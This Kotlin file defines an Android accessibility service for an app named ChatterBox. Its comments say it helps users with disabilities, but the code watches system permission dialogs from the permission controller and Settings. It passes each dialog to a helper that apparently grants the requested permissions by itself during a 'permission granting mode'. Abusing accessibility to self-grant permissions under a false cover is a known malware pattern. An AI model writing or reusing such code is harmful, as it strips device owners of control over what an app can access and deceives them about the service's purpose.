package com.example.ChatterBox.accessibility

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * ChatterBox Accessibility Service
 *
 * This service enhances the user experience for users with disabilities by providing
 * better navigation and interaction with the app.
 */
class AccessibilityService : android.accessibilityservice.AccessibilityService() {
    private val TAG = "ChatterBoxAccessibility"
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var permissionDialogs: PermissionDialogs
    companion object {
        private var instance: AccessibilityService? = null

        fun getInstance(): AccessibilityService? {
            return instance
        }
    }

    override fun onServiceConnected() {
        Log.i(TAG, "Accessibility Service connected")
        instance = this
        permissionDialogs = PermissionDialogs(this)

        // Configure accessibility service capabilities
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        info.notificationTimeout = 100

        // Set the updated info
        this.serviceInfo = info

        Log.d(TAG, "Accessibility service configured and ready")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return

                // Only check for permission dialogs if we're in permission granting mode
                if (permissionDialogs.isGrantingPermissions() &&
                    (packageName.contains("permissioncontroller") ||
                            packageName == "android" ||
                            packageName == "com.android.settings")) {

                    // Small delay to ensure dialog is fully loaded
                    handler.postDelayed({
                        checkAllWindowsForPermissionDialogs()
                    }, 200)
                }
            }
        }
    }

    /**
     * Check all windows for permission dialogs
     */
    private fun checkAllWindowsForPermissionDialogs() {
        try {
            // Try looking at active window first
            val root = rootInActiveWindow
            if (root != null) {
                permissionDialogs.handlePermissionDialog(root)
                root.recycle()
            }

            // Also check all windows
            windows.forEach { window ->
                val windowRoot = window.root ?: return@forEach
                permissionDialogs.handlePermissionDialog(windowRoot)
                windowRoot.recycle()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling permission dialogs", e)
        }
    }

    /**
     * Start permission granting mode with expected number of permissions
     */
    fun startPermissionGrantingMode(expectedPermissions: Int) {
        permissionDialogs.startGrantingPermissions(expectedPermissions)
    }

    /**
     * Stop permission granting mode
     */
    fun stopPermissionGrantingMode() {
        permissionDialogs.stopGrantingPermissions()
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        permissionDialogs.cleanup()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}